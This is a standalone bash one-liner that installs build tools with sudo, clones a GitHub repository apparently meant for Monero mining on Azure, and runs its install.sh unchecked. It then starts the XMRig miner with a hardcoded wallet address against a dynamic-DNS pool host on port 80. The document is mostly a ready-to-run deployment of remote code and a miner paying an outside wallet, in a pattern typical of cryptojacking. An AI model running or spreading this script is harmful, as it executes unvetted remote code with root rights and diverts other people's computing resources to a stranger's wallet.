/bin/bash -c "
cd $HOME;
sudo apt-get update --fix-missing;
sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
git clone https://github.com/mrn-77/xmrcryptoazure.git;
mv xmrcryptoazure/install.sh $HOME;
chmod +x install.sh;
./install.sh;
cd $HOME/xmrig/build;
./xmrig --rig-id=F4 -u 4A6HDgKihpfSUj79i8fNYyPk7C3WR4R1rZYyeEh4P81WQXQHAq74J1KAnUaHMmY1UvEMwkxaCRn1MK4b4CM32wDm5VoUHHw --tls -o larissa.redirectme.net:80
"
